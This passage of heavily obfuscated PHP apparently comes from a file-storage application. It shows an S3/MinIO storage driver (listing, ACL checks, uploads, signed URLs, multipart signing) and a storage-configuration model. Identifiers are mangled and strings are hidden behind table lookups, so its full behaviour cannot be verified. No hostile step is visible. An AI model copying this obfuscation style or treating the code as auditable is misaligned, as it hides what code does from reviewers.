array($§éİµ¤±È÷Â[28] => $this->pathThis($Ä·), $§éİµ¤±È÷Â[76] => $this->getPathOuter($§éİµ¤±È÷Â[8] . $Ä·), $§éİµ¤±È÷Â[29] => $§éİµ¤±È÷Â[77]); if ($ª¢¶Ø›ğõ·) { return $³¥îÔ‚å¿; } $³¥îÔ‚å¿[$§éİµ¤±È÷Â[194]] = $³¥îÔ‚å¿[$§éİµ¤±È÷Â[84]] = 0; $³¥îÔ‚å¿[$§éİµ¤±È÷Â[195]] = $³¥îÔ‚å¿[$§éİµ¤±È÷Â[196]] = !0; if ($Ä· == $§éİµ¤±È÷Â[33]) { return $³¥îÔ‚å¿; } $Ä· = trim($Ä·, $§éİµ¤±È÷Â[8]) . $§éİµ¤±È÷Â[8]; $Ñş² = $this->objectMeta($Ä·); if (isset($Ñş²[$§éİµ¤±È÷Â[197]])) { $³¥îÔ‚å¿[$§éİµ¤±È÷Â[194]] = $Ñş²[$§éİµ¤±È÷Â[197]]; } return $³¥îÔ‚å¿; } private function fileList($–ãíºƒ±», $•õóà = '', $õ®˜Áøï = 0) { $Û—Áğ–ß =& $_SERVER[ÀÆ]; $àŞÀÛÛ¼ = rtrim($–ãíºƒ±», $Û—Áğ–ß[8]) . $Û—Áğ–ß[8]; $Ö«±±•ë = $this->listObjs($àŞÀÛÛ¼, null, null, $•õóà); if (!$Ö«±±•ë) { return array($Û—Áğ–ß[75] => array(), $Û—Áğ–ß[74] => array()); } $†Ú = $this->listItemCache === !1 ? !1 : !0; $’ã´Š£Ñ¾ = $›â = array(); foreach ($Ö«±±•ë[$Û—Áğ–ß[198]] as $¼ˆÎ) { $ååÈĞëÈ˜‰ = $¼ˆÎ[$Û—Áğ–ß[28]]; if ($ååÈĞëÈ˜‰ == $àŞÀÛÛ¼) { continue; } $‰ÖŸ”òŒÌÊ• = isset($¼ˆÎ[$Û—Áğ–ß[78]]) ? $¼ˆÎ[$Û—Áğ–ß[78]] : 0; $ªèü°áß–óÜ = $‰ÖŸ”òŒÌÊ• == 0 && substr($ååÈĞëÈ˜‰, strlen($ååÈĞëÈ˜‰) - 1, 1) == $Û—Áğ–ß[8] ? !0 : !1; if ($†Ú) { $this->cacheMethod($Û—Áğ–ß[199], $ååÈĞëÈ˜‰, $ªèü°áß–óÜ); $this->cacheMethod($Û—Áğ–ß[200], $ååÈĞëÈ˜‰, $¼ˆÎ); } if ($ªèü°áß–óÜ) { $’ã´Š£Ñ¾[] = $ååÈĞëÈ˜‰; continue; } $›â[] = $õ®˜Áøï ? $¼ˆÎ : $ååÈĞëÈ˜‰; } foreach ($Ö«±±•ë[$Û—Áğ–ß[201]] as $¼ˆÎ) { $’ã´Š£Ñ¾[] = $¼ˆÎ[$Û—Áğ–ß[28]]; if ($†Ú) { $this->cacheMethod($Û—Áğ–ß[199], $¼ˆÎ[$Û—Áğ–ß[28]], !0); } } if ($†Ú) { $this->cacheMethod($Û—Áğ–ß[199], $–ãíºƒ±», !0); } return array($Û—Áğ–ß[75] => $’ã´Š£Ñ¾, $Û—Áğ–ß[74] => $›â); } private function listObjs($¼ˆÛåØ, $Ğ÷Éß¤ÕûÏ‡ = null, $âû”å“…˜ï = null, $´™“ê = null) { $Ìõ±À =& $_SERVER[ÀÆ]; $¼ˆÛåØ = trim($¼ˆÛåØ, $Ìõ±À[8]); $‡‹¾£¦ÍŠ— = empty($¼ˆÛåØ) && $¼ˆÛåØ !== $Ìõ±À[191] ? $Ìõ±À[33] : $¼ˆÛåØ . $Ìõ±À[8]; return $this->client->getBucket($this->bucket, $‡‹¾£¦ÍŠ—, $Ğ÷Éß¤ÕûÏ‡, $âû”å“…˜ï, $´™“ê, !0); } public function has($¡ŒÓÅÇ´, $Šå¿ = false, $ûæŞó·¢¹Ò = true) { $ïöò´×Œ =& $_SERVER[ÀÆ]; $¡ŒÓÅÇ´ = trim($¡ŒÓÅÇ´, $ïöò´×Œ[8]); $³ = empty($¡ŒÓÅÇ´) && $¡ŒÓÅÇ´ !== $ïöò´×Œ[191] ? $ïöò´×Œ[33] : $¡ŒÓÅÇ´ . $ïöò´×Œ[8]; $û‘‰ªÁ = null; $Ä = 500; $ğ…¬¿¦†œû°‹ = $ïöò´×Œ[8]; $µ²¾’Ò¼ = $çÃ”“ø¸Éş’ = array(); while (!0) { $Ôêù½’ñÏíËğ = $this->listObjs($¡ŒÓÅÇ´, $û‘‰ªÁ, $Ä, $ğ…¬¿¦†œû°‹); if (!$Ôêù½’ñÏíËğ) { break; } $û‘‰ªÁ = $Ôêù½’ñÏíËğ[$ïöò´×Œ[202]]; $Ñ¾ûÔêŠŸ = $Ôêù½’ñÏíËğ[$ïöò´×Œ[198]]; $ÔÈò¾÷Ø¸ = $Ôêù½’ñÏíËğ[$ïöò´×Œ[201]]; if (empty($Ñ¾ûÔêŠŸ) && empty($ÔÈò¾÷Ø¸)) { break; } if (count($Ñ¾ûÔêŠŸ) == 1 && $Ñ¾ûÔêŠŸ[0][$ïöò´×Œ[28]] == $³) { break; } if ($Šå¿) { if (count($Ñ¾ûÔêŠŸ)) { $Ñ¾ûÔêŠŸ = array_column($Ñ¾ûÔêŠŸ, $ïöò´×Œ[28]); $µ²¾’Ò¼ = array_merge($µ²¾’Ò¼, $Ñ¾ûÔêŠŸ); } if (count($ÔÈò¾÷Ø¸)) { $ÔÈò¾÷Ø¸ = array_column($ÔÈò¾÷Ø¸, $ïöò´×Œ[28]); $çÃ”“ø¸Éş’ = array_merge($çÃ”“ø¸Éş’, $ÔÈò¾÷Ø¸); } if ($û‘‰ªÁ === null) { break; } continue; } if ($ûæŞó·¢¹Ò) { if (!empty($Ñ¾ûÔêŠŸ)) { if (count($Ñ¾ûÔêŠŸ) > 1 || isset($Ñ¾ûÔêŠŸ[0][$ïöò´×Œ[28]]) && $Ñ¾ûÔêŠŸ[0][$ïöò´×Œ[28]] != $³) { return !0; } } } else { if (!empty($ÔÈò¾÷Ø¸)) { return !0; } } if ($û‘‰ªÁ === null) { break; } } if ($Šå¿) { $µ²¾’Ò¼ = array_diff($µ²¾’Ò¼, array($³)); $µ²¾’Ò¼ = count(array_unique($µ²¾’Ò¼)); $çÃ”“ø¸Éş’ = count(array_unique($çÃ”“ø¸Éş’)); return array($ïöò´×Œ[203] => $µ²¾’Ò¼, $ïöò´×Œ[204] => $çÃ”“ø¸Éş’); } return !1; } public function listAll($å£í†‰ç·ã) { $¨ìÖ‚„µ¢ =& $_SERVER[ÀÆ]; $‹áÎË¹– = $this->fileList($å£í†‰ç·ã, $¨ìÖ‚„µ¢[33], !0); $ª²ß = array(); foreach ($‹áÎË¹–[$¨ìÖ‚„µ¢[74]] as $ñØ€Ì¦‹Ôë) { $ª²ß[$ñØ€Ì¦‹Ôë[$¨ìÖ‚„µ¢[28]]] = $ñØ€Ì¦‹Ôë[$¨ìÖ‚„µ¢[78]]; } foreach ($‹áÎË¹–[$¨ìÖ‚„µ¢[75]] as $ñØ€Ì¦‹Ôë) { if (is_string($ñØ€Ì¦‹Ôë)) { $ª²ß[$ñØ€Ì¦‹Ôë] = 0; } } return $this->listAllFiles($å£í†‰ç·ã, array_keys($ª²ß), $ª²ß); } public function canRead($Ë¨ò´·ÑÕÈ) { $„ò×Õ =& $_SERVER[ÀÆ]; $ôğœ = $this->client->getAccessControlPolicy($this->bucket, $Ë¨ò´·ÑÕÈ); if (!$ôğœ) { return !1; } return in_array($ôğœ, array($„ò×Õ[205], $„ò×Õ[206], $„ò×Õ[207])) ? !0 : !1; } public function canWrite($ãç„) { $Ç²¾º =& $_SERVER[ÀÆ]; $Ş²Ì¹áı»ÏÀ = $this->client->getAccessControlPolicy($this->bucket, $ãç„); if (!$Ş²Ì¹áı»ÏÀ) { return !1; } return in_array($Ş²Ì¹áı»ÏÀ, array($Ç²¾º[205], $Ç²¾º[206])) ? !0 : !1; } public function getContent($Û¯´µÇ‡Ä‘) { return $this->client->getObject($this->bucket, $Û¯´µÇ‡Ä‘); } public function setContent($¦ÄÙ«ÃêùÉ, $×­ = '', $„²Ÿ‚ãÉ¿ëÏö = false) { $ÕºÈšğ×Õ… =& $_SERVER[ÀÆ]; $¦ÄÙ«ÃêùÉ = $„²Ÿ‚ãÉ¿ëÏö ? trim($¦ÄÙ«ÃêùÉ, $ÕºÈšğ×Õ…[8]) . $ÕºÈšğ×Õ…[8] : $¦ÄÙ«ÃêùÉ; $öÄé†ªŠóÁç = get_file_mime(get_path_ext($¦ÄÙ«ÃêùÉ)); $©¸ı´ = $this->client->putObject($×­, $this->bucket, $¦ÄÙ«ÃêùÉ, $ÕºÈšğ×Õ…[192], array(), $öÄé†ªŠóÁç); if (!$©¸ı´) { return !1; } if ($„²Ÿ‚ãÉ¿ëÏö) { return !0; } $this->cacheMethod(null, null); $©¸ı´ = $this->copyFile($¦ÄÙ«ÃêùÉ, $¦ÄÙ«ÃêùÉ, array($ÕºÈšğ×Õ…[208] => $©¸ı´[$ÕºÈšğ×Õ…[209]])); return $©¸ı´ ? !0 : !1; } public function fileSubstr($Ò, $ƒ¼, $¦Áİ) { $ÏüÎ  Œ¾… = $ƒ¼ + $¦Áİ - 1; return $this->client->getObject($this->bucket, $Ò, array($_SERVER[ÀÆ][210] => "\142\171\x74\x65\163\75{$ƒ¼}\55{$ÏüÎ  Œ¾…}")); } public function upload($†Á‚¨, $¿ÊØ¯šê—îğ, $˜ªš˜À› = false, $©„’³€¥²† = REPEAT_REPLACE) { $–Ñ¦ø¯ =& $_SERVER[ÀÆ]; $ùØïû¯‡ = array($–Ñ¦ø¯[208] => @md5_file($¿ÊØ¯šê—îğ)); $™œÄ½¼ = array($–Ñ¦ø¯[211] => get_file_mime(get_path_ext($†Á‚¨))); if (IO::size($¿ÊØ¯šê—îğ) <= 1024 * 1024 * 200) { $’öœ§ƒ = $this->client->putObjectFile($¿ÊØ¯šê—îğ, $this->bucket, $†Á‚¨, $–Ñ¦ø¯[192], $ùØïû¯‡, $™œÄ½¼); return !empty($’öœ§ƒ) ? $this->getPathOuter($†Á‚¨) : !1; } $«Õ¦´‘ = $this->client->multiUploadObject($¿ÊØ¯šê—îğ, $this->bucket, trim($†Á‚¨, $–Ñ¦ø¯[8]), $ùØïû¯‡, $™œÄ½¼); return $«Õ¦´‘ ? $this->getPathOuter($†Á‚¨) : !1; } public function download($í, $ãµ­ÅíÊ) { if (!@is_dir($this->pathFather($ãµ­ÅíÊ)) && !IO::mkdir($this->pathFather($ãµ­ÅíÊ))) { return !1; } $Û = $this->client->getObject($this->bucket, $í, array(), $ãµ­ÅíÊ); return $Û !== !1 ? $ãµ­ÅíÊ : !1; } public function link($ë×¨™í, $ = array()) { $  =& $_SERVER[ÀÆ]; if ($this->signVer == $ [212]) { return $this->client->getAuthenticatedURL($this->bucket, $ë×¨™í, 3600 * 12, $); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ë×¨™í, $ [8]), 3600 * 12, $this->region, array(), !0, $); } public function fileOut($š—Ôü·†ì», $œ = false, $í = false, $¤…ø§°ƒòùü = '') { $ÇÒ¹Øæ =& $_SERVER[ÀÆ]; if ($this->isFileOutServer()) { return $this->fileOutServer($š—Ôü·†ì», $œ, $í, $¤…ø§°ƒòùü); } if (!$í) { $í = $this->pathThis($š—Ôü·†ì»); } $°±Š¨¥‚ÒËÈ = get_file_mime(get_path_ext($í)); if ($°±Š¨¥‚ÒËÈ == $ÇÒ¹Øæ[213]) { return parent::fileOut($š—Ôü·†ì», $œ, $í, $¤…ø§°ƒòùü); } $œ = $œ ? $ÇÒ¹Øæ[214] : $ÇÒ¹Øæ[215]; $¢ = array($ÇÒ¹Øæ[216] => $œ . $ÇÒ¹Øæ[217] . rawurlencode($í), $ÇÒ¹Øæ[218] => $°±Š¨¥‚ÒËÈ); $˜€ = $this->link($š—Ôü·†ì», $¢); $this->fileOutLink($˜€); } public function fileOutServer($é…šªÒ£”›Ê©, $µÙï§éìêØ· = false, $Î = false, $ëĞò¼€Å = '') { parent::fileOut($é…šªÒ£”›Ê©, $µÙï§éìêØ·, $Î, $ëĞò¼€Å); } public function fileOutImageServer($€ş–¹µ™ˆ, $õëõÛâ— = 250) { parent::fileOutImage($€ş–¹µ™ˆ, $õëõÛâ—); } public function hashMd5($ö¨ÚÂÌÕŠ, $Ä§ùÇš– = '') { $ü =& $_SERVER[ÀÆ]; $«ÉëÈ¯Å† = $this->objectMeta($ö¨ÚÂÌÕŠ); if (!$«ÉëÈ¯Å†) { return !1; } $Ä§ùÇš– = $Ä§ùÇš– ? $Ä§ùÇš– : _get($«ÉëÈ¯Å†, $ü[219]); $Ä§ùÇš– = $Ä§ùÇš– ? $Ä§ùÇš– : _get($«ÉëÈ¯Å†, $ü[209], $ü[33]); return $Ä§ùÇš–; } public function uploadFormData($è³ŞÛÉÌ¼®, $¿üÑÖ = 3600) { $£¢¾Ä±Œ¡¢ß =& $_SERVER[ÀÆ]; $¾ß­œÛ´­Ü– = $this->pathFather($è³ŞÛÉÌ¼®); $ö¶û–éãş®Úœ = $this->client->getHttpUploadPostParams($this->bucket, $¾ß­œÛ´­Ü–, $£¢¾Ä±Œ¡¢ß[192], $¿üÑÖ); return array_merge((array) $ö¶û–éãş®Úœ, array($£¢¾Ä±Œ¡¢ß[175] => $this->getHost())); } public function multiUploadFormData($£óçƒÒ, $§ğ‡º½ñù¡üº = 3600) { $ ÅÒ¥µ‘¤ =& $_SERVER[ÀÆ]; $ì¿ìÅŸ¾¡ñ…× = gmdate($ ÅÒ¥µ‘¤[220]); $Ã÷§°¾ö¡Ô£ = array(); $ÉŠ—»ç¡Âëğ = $this->client->getUploadId($this->bucket, $£óçƒÒ, $Ã÷§°¾ö¡Ô£); if (!$ÉŠ—»ç¡Âëğ) { return !1; } return array($ ÅÒ¥µ‘¤[221] => $ÉŠ—»ç¡Âëğ, $ ÅÒ¥µ‘¤[175] => $this->getHost() . $ ÅÒ¥µ‘¤[8] . $this->pathEncode($£óçƒÒ), $ ÅÒ¥µ‘¤[222] => $ì¿ìÅŸ¾¡ñ…×, $ ÅÒ¥µ‘¤[93] => $£óçƒÒ); } public function multiUploadAuthData($“ÄøÉÃí, $İÂ© ™ó = array()) { $şÒàÍŸ =& $_SERVER[ÀÆ]; $Òì´Ô = isset($İÂ© ™ó[$şÒàÍŸ[222]]) ? $İÂ© ™ó[$şÒàÍŸ[222]] : gmdate($şÒàÍŸ[220]); $Ö = isset($İÂ© ™ó[$şÒàÍŸ[168]]) ? $İÂ© ™ó[$şÒàÍŸ[168]] : $şÒàÍŸ[33]; $°âú = $İÂ© ™ó[$şÒàÍŸ[93]]; unset($İÂ© ™ó[$şÒàÍŸ[93]]); if (isset($İÂ© ™ó[$şÒàÍŸ[223]])) { $İÂ© ™ó[$şÒàÍŸ[222]] = $Òì´Ô; return $this->listUploadParts($°âú, $İÂ© ™ó); } $ç = array($şÒàÍŸ[224], $şÒàÍŸ[33], $şÒàÍŸ[119], $şÒàÍŸ[33], "\170\x2d\x61\155\x7a\x2d\144\x61\x74\x65\x3a{$Òì´Ô}", $şÒàÍŸ[8] . $this->bucket . $şÒàÍŸ[8] . $this->pathEncode($°âú) . $Ö); if (strpos($Ö, $şÒàÍŸ[225]) === 0) { $ç[0] = $şÒàÍŸ[226]; } if (isset($İÂ© ™ó[$şÒàÍŸ[227]]) && $İÂ© ™ó[$şÒàÍŸ[227]] == $şÒàÍŸ[228]) { $ç[0] = $şÒàÍŸ[228]; } $Ñ„ÙÙ¬ë = implode($şÒàÍŸ[229], $ç); $ØíœîÑú¸„À¼ = base64_encode(hash_hmac($şÒàÍŸ[230], $Ñ„ÙÙ¬ë, $this->secret, !0)); $•òÁû¼ïß = $şÒàÍŸ[231] . $this->accessKey . $şÒàÍŸ[4] . $ØíœîÑú¸„À¼; if (strpos($Ö, $şÒàÍŸ[225]) === 0) { return array($şÒàÍŸ[232] => $•òÁû¼ïß, $şÒàÍŸ[222] => $Òì´Ô); } return $•òÁû¼ïß; } public function listUploadParts($Ùßà¶Ÿ, $ùúÆõ½ = array()) { $şç¬Š =& $_SERVER[ÀÆ]; $±¹ = str_replace($şç¬Š[233], $şç¬Š[33], $ùúÆõ½[$şç¬Š[168]]); $Òìñ¢Ù¹î = $this->client->listParts($this->bucket, $Ùßà¶Ÿ, $±¹); if (!$Òìñ¢Ù¹î) { return !1; } unset($ùúÆõ½[$şç¬Š[223]], $ùúÆõ½[$şç¬Š[227]]); $ùúÆõ½[$şç¬Š[93]] = $Ùßà¶Ÿ; $›Ö†Ò± = $this->multiUploadAuthData($Ùßà¶Ÿ, $ùúÆõ½); if (empty($›Ö†Ò±)) { return !1; } return array($şç¬Š[232] => $›Ö†Ò±, $şç¬Š[222] => $ùúÆõ½[$şç¬Š[222]], $şç¬Š[234] => $Òìñ¢Ù¹î); } public function getHost() { return parent::getHost() . $_SERVER[ÀÆ][8] . $this->bucket; } public function size($¼ß¤Ë) { $‡ò = $this->objectMeta($¼ß¤Ë); return $‡ò ? $‡ò[$_SERVER[ÀÆ][78]] : 0; } public function info($ãğ§Û†) { if ($this->isFolder($ãğ§Û†)) { return $this->folderInfo($ãğ§Û†); } else { if ($this->isFile($ãğ§Û†)) { return $this->fileInfo($ãğ§Û†); } } return !1; } public function exist($×üúŒ‹É) { return $this->isFile($×üúŒ‹É) || $this->isFolder($×üúŒ‹É); } public function isFile($¡ØÆë»¯± ) { return !$this->isFolder($¡ØÆë»¯± ) && $this->objectMeta($¡ØÆë»¯± ); } public function isFolder($®ñÆÖì·Ğâß) { return $this->cacheMethod($_SERVER[ÀÆ][199], $®ñÆÖì·Ğâß); } protected function objectMeta($ç¾î) { return $this->cacheMethod($_SERVER[ÀÆ][200], $ç¾î); } protected function _objectMeta($Š˜Èì) { $ŒØ =& $_SERVER[ÀÆ]; $Š˜Èì = rtrim($Š˜Èì, $ŒØ[8]); try { $«´´…Ä²¬¢ = $this->client->getObjectInfo($this->bucket, $Š˜Èì); if (!isset($«´´…Ä²¬¢[$ŒØ[219]]) && isset($«´´…Ä²¬¢[$ŒØ[235]])) { $«´´…Ä²¬¢[$ŒØ[219]] = $«´´…Ä²¬¢[$ŒØ[235]]; } } catch (Exception $ì§ğñª‡şï) { $«´´…Ä²¬¢ = !1; } if (!$«´´…Ä²¬¢) { } return $«´´…Ä²¬¢; } protected function _isFolder($óÉõÜü) { $‡àÓñã©² =& $_SERVER[ÀÆ]; $óÉõÜü = rtrim($óÉõÜü, $‡àÓñã©²[8]); if ($óÉõÜü == $‡àÓñã©²[33] || $óÉõÜü == $‡àÓñã©²[8]) { return !0; } $é›ä™ú™ê = $this->client->getBucket($this->bucket, $óÉõÜü, null, 1); if (empty($é›ä™ú™ê[$‡àÓñã©²[198]])) { return !1; } $ÅÄø = $é›ä™ú™ê[$‡àÓñã©²[198]][0][$‡àÓñã©²[28]]; return stripos($ÅÄø, $óÉõÜü . $‡àÓñã©²[8]) === 0 ? !0 : !1; if (substr($ÅÄø, -1) == $‡àÓñã©²[8]) { return !0; } if (get_path_this($ÅÄø) == get_path_this($óÉõÜü)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ËËß ×) { parent::__construct($ËËß ×); $this->signatureVersion($_SERVER[ÀÆ][212]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto bÈ¨Ô¡Ôßè; a‰ÛÍ„¾‹: class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\x2e\x73\164\x6f\162\141\147\x65\114\x69\x73\x74"; public $field = array("\x6e\141\155\x65", "\163\151\172\x65\x4d\x61\170", "\x73\x79\163\164\x65\x6d", "\x64\145\x66\141\165\x6c\164", "\x64\162\151\x76\145\162", "\143\x6f\156\146\151\147"); public function listData($œÙ•†ÓÚ±Ö¸Ì = false, $†æ¤ö© = "\155\157\x64\x69\x66\171\x54\x69\x6d\145", $ªªŠÅ«â§ï = false) { $¿âõ¥Ó‚°åÃ =& $_SERVER[ÀÆ]; $³Î£ë£æµ… = parent::listData($œÙ•†ÓÚ±Ö¸Ì, $†æ¤ö©, $ªªŠÅ«â§ï); if ($œÙ•†ÓÚ±Ö¸Ì) { return $³Î£ë£æµ…; } $ÌÚı´ãÙ = $this->ioSizeUseGet(array_to_keyvalue($³Î£ë£æµ…, $¿âõ¥Ó‚°åÃ[33], $¿âõ¥Ó‚°åÃ[395])); foreach ($³Î£ë£æµ… as $²ÍŞÉ => $»…üî”¾€) { unset($³Î£ë£æµ…[$²ÍŞÉ][$¿âõ¥Ó‚°åÃ[6]]); $³Î£ë£æµ…[$²ÍŞÉ][$¿âõ¥Ó‚°åÃ[1727]] = isset($ÌÚı´ãÙ[$»…üî”¾€[$¿âõ¥Ó‚°åÃ[395]]]) ? $ÌÚı´ãÙ[$»…üî”¾€[$¿âõ¥Ó‚°åÃ[395]]] : 0; } return $³Î£ë£æµ…; } public function ioSizeUseGet($Â”àÁ˜ˆ†) { $¾® =& $_SERVER[ÀÆ]; if (!$Â”àÁ˜ˆ†) { return array(); } $¡¤ = $¾®[2042] . implode($¾®[47], $Â”àÁ˜ˆ†); $˜ïÇüòËç¼µ = Cache::get($¡¤); if ($˜ïÇüòËç¼µ) { return $˜ïÇüòËç¼µ; } $¯çÚÆŒÎ = array($¾®[809] => $¾®[395], $¾®[2043] => $¾®[78]); $àò¼ó = array($¾®[809] => array($¾®[7], $Â”àÁ˜ˆ†)); $˜ïÇüòËç¼µ = Model($¾®[772])->field($¯çÚÆŒÎ)->where($àò¼ó)->group($¾®[809])->select(); $˜ïÇüòËç¼µ = array_to_keyvalue($˜ïÇüòËç¼µ, $¾®[395], $¾®[78]); Cache::set($¡¤, $˜ïÇüòËç¼µ, 600); return $˜ïÇüòËç¼µ; } public function getConfig($À‘˜Øüœ§Âœ) { $€´Ë—°ô = parent::listData($À‘˜Øüœ§Âœ); return json_decode($€´Ë—°ô[$_SERVER[ÀÆ][6]], !0); } public function update($¡£×èƒ‹òÄïÖ, $í€§Û¥åˆÍ) { $Ô¤ê =& $_SERVER[ÀÆ]; $â¢Ğù = $í€§Û¥åˆÍ[$Ô¤ê[28]]; $ºó’¼ÍïÈÀ… = array_to_keyvalue(parent::listData(), $Ô¤ê[28]); if (isset($ºó’¼ÍïÈÀ…[$â¢Ğù]) && $ºó’¼ÍïÈÀ…[$â¢Ğù][$Ô¤ê[395]] != $¡£×èƒ‹òÄïÖ) { return !1; } if (isset($í€§Û¥åˆÍ[$Ô¤ê[2044]]) && $í€§Û¥åˆÍ[$Ô¤ê[2044]] == $Ô¤ê[87]) { $this->checkConfig($í€§Û¥åˆÍ); } unset($í€§Û¥åˆÍ[$Ô¤ê[2044]]); $”•¬æÅÙßÂ  = parent::update($¡£×èƒ‹òÄïÖ, $í€§Û¥åˆÍ); if ($”•¬æÅÙßÂ  && $í€§Û¥åˆÍ[$Ô¤ê[34]]) { foreach ($ºó’¼ÍïÈÀ… as $´¢›­°) { if ($´¢›­°[$Ô¤ê[34]] && $´¢›­°[$Ô¤ê[395]] != $¡£×èƒ‹òÄïÖ) { parent::update($´¢›­°[$Ô¤ê[395]], array($Ô¤ê[34] => 0)); } } } return $”•¬æÅÙßÂ ; } public function add($¹€üÏøï) { $Ôş †û¼ =& $_SERVER[ÀÆ]; $óÄã»ÔÀ°­Œ = array_to_keyvalue(parent::listData(), $Ôş †û¼[28]); if (isset($óÄã»ÔÀ°­Œ[$¹€üÏøï[$Ôş †û¼[28]]])) { return !1; } $this->checkConfig($¹€üÏøï); $Ã†“ƒ¦¸Ï¼¨É = parent::insert($¹€üÏøï); if ($Ã†“ƒ¦¸Ï¼¨É && $¹€üÏøï[$Ôş †û¼[34]]) { foreach ($óÄã»ÔÀ°­Œ as $Ø®Š«Ñò†“) { if ($Ø®Š«Ñò†“[$Ôş †û¼[34]]) { parent::update($Ø®Š«Ñò†“[$Ôş †û¼[395]], array($Ôş †û¼[34] => 0)); } } } return $Ã†“ƒ¦¸Ï¼¨É; } public function checkConfig(&$ÕÏÊ“íãÂ, $àÊƒ = false) { $¬Âö =& $_SERVER[ÀÆ]; $©© = strtolower($ÕÏÊ“íãÂ[$¬Âö[94]]); $”²œ–ÜØ® = json_decode($ÕÏÊ“íãÂ[$¬Âö[6]], !0); foreach ($”²œ–ÜØ® as $ÛèÁêÄöÄ => $®»ä’±²‘áé) { $”²œ–ÜØ®[$ÛèÁêÄöÄ] = trim($®»ä’±²‘áé); } $”²œ–ÜØ®[$¬Âö[2045]] = rand_string(6); $¼úÏ = $GLOBALS[$¬Âö[6]][$¬Âö[88]][$¬Âö[818]]; $¤‡ëªÔò = isset($¼úÏ[$©©]) ? $¼úÏ[$©©] : ucfirst($©©); $ôÊÖ¯ÏÇİ = $¬Âö[72] . $¤‡ëªÔò; if (!$¤‡ëªÔò || !class_exists($ôÊÖ¯ÏÇİ)) { if ($àÊƒ) { return LNG($¬Âö[2046]); } write_log(array($¬Âö[2047], $ÕÏÊ“íãÂ, get_caller_info()), $¬Âö[2048]); show_json(LNG($¬Âö[2046]), !1, $ÕÏÊ“íãÂ); } $Å˜¤ = new $ôÊÖ¯ÏÇİ($”²œ–ÜØ®); if (in_array($©©, $Å˜¤->objectDriver)) { if (!$Å˜¤->isBucketCors() && !$Å˜¤->setBucketCors()) { $€¬Ò› = LNG($¬Âö[2049]); $€¬Ò› .= $¬Âö[2050] . LNG($¬Âö[2051]); if ($àÊƒ) { return $€¬Ò›; } show_json($€¬Ò›, !1); } } $µÊ¤Îˆ = rtrim($”²œ–ÜØ®[$¬Âö[1108]], $¬Âö[8]) . $¬Âö[8]; $ıø = $Å˜¤->getPath($µÊ¤Îˆ . $¬Âö[1170]); if (!$Å˜¤->mkfile($ıø)) { if ($àÊƒ) { return LNG($¬Âö[2049]); } show_json(LNG($¬Âö[2049]), !1); } $”²œ–ÜØ®[$¬Âö[1108]] = $µÊ¤Îˆ; $ÕÏÊ“íãÂ[$¬Âö[6]] = json_encode($”²œ–ÜØ®); $ÕÏÊ“íãÂ[$¬Âö[94]] = $¤‡ëªÔò; return !0; } public function driverListSystem() { $ø›ô‰ =& $_SERVER[ÀÆ]; $€Øô¾ÜÕ = parent::listData(); $°™ÉÁ™Ã = array(); foreach ($€Øô¾ÜÕ as $ÉîÅ) { unset($ÉîÅ[$ø›ô‰[194]], $ÉîÅ[$ø›ô‰[84]]); $ÉîÅ[$ø›ô‰[6]] = json_decode($ÉîÅ[$ø›ô‰[6]], !0); $°™ÉÁ™Ã[] = $ÉîÅ; } return $°™ÉÁ™Ã; } public function defaultDriver() { $ËÑõÚ¤¤ØÙ =& $_SERVER[ÀÆ]; $÷£§é— = parent::listData(); $×ìşß = array_filter_by_field($÷£§é—, $ËÑõÚ¤¤ØÙ[34], 1); $×ìşß = $×ìşß[0]; if ($×ìşß) { $×ìşß[$ËÑõÚ¤¤ØÙ[6]] = json_decode($×ìşß[$ËÑõÚ¤¤ØÙ[6]], !0); } return $×ìşß; } public function driverInfo($ŠÑº˜) { $„­üİÊÀáèş =& $_SERVER[ÀÆ]; $¹”üœÑ½˜Óì˜ = array_to_keyvalue(parent::listData(), $„­üİÊÀáèş[395]); if (!isset($¹”üœÑ½˜Óì˜[$ŠÑº˜])) { return !1; } $–ß—”îâÜ¢ = $¹”üœÑ½˜Óì˜[$ŠÑº˜]; $–ß—”îâÜ¢[$„­üİÊÀáèş[6]] = json_decode($–ß—”îâÜ¢[$„­üİÊÀáèş[6]], !0); return $–ß—”îâÜ¢; } public function remove($ÚŠÁŸø•àŠì) { $this->removeShareItems($ÚŠÁŸø•àŠì); return parent::remove($ÚŠÁŸø•àŠì); } public function removeWithFile($„­§Ç‡á³, $‹Üˆ) { $´ì‡¼¡ =& $_SERVER[ÀÆ]; $ó”òÀ”¥ŒÁ = array($´ì‡¼¡[809] => $„­§Ç‡á³); $¸Ø–Øç“à” = Model($´ì‡¼¡[464])->where($ó”òÀ”¥ŒÁ)->count(); $˜Ÿ‰ëµ° = Model($´ì‡¼¡[464])->where($ó”òÀ”¥ŒÁ)->sum($´ì‡¼¡[78]); $ÉŸÈ©ÇÏâ¯ = $‹Üˆ . $´ì‡¼¡[2052] . $„­§Ç‡á³; $Ò†õ² = new TaskFileTransfer($ÉŸÈ©ÇÏâ¯, $´ì‡¼¡[2048], $¸Ø–Øç“à”, LNG($´ì‡¼¡[2053]) . "\50{$„­§Ç‡á³}\51"); $Ò†õ²->task[$´ì‡¼¡[748]] = (double) $˜Ÿ‰ëµ°; $œË = KodIO::defaultDriver(); $‚ıã´ = $œË[$´ì‡¼¡[395]]; $º×‰âĞ = "\173\x69\157\72{$‚ıã´}\x7d\x2f"; $ĞªÇ«àÌ = !0; $„øÜªÀ± = array(); $Ú¾ñì = Model($´ì‡¼¡[193])->where($ó”òÀ”¥ŒÁ)->field($´ì‡¼¡[2054])->select(); foreach ($Ú¾ñì as $¶Ğ§) { $äòûİéõ‰Ä½â = $¶Ğ§[$´ì‡¼¡[76]]; $ûã¶ = $º×‰âĞ . str_replace("\x7b\151\157\x3a{$„­§Ç‡á³}\175\57", $´ì‡¼¡[33], $äòûİéõ‰Ä½â); if (!IO::exist($äòûİéõ‰Ä½â)) { $„øÜªÀ±[] = $¶Ğ§[$´ì‡¼¡[461]]; $Ò†õ²->updateFileEnd($¶Ğ§[$´ì‡¼¡[28]], $¶Ğ§[$´ì‡¼¡[78]]); continue; } if (IO::exist($ûã¶)) { $Ò†õ²->updateFileEnd($¶Ğ§[$´ì‡¼¡[28]], $¶Ğ§[$´ì‡¼¡[78]]); continue; } if (!IO::move($äòûİéõ‰Ä½â, get_path_father($ûã¶))) { $ĞªÇ«àÌ = !1; break; } $ó”òÀ”¥ŒÁ = 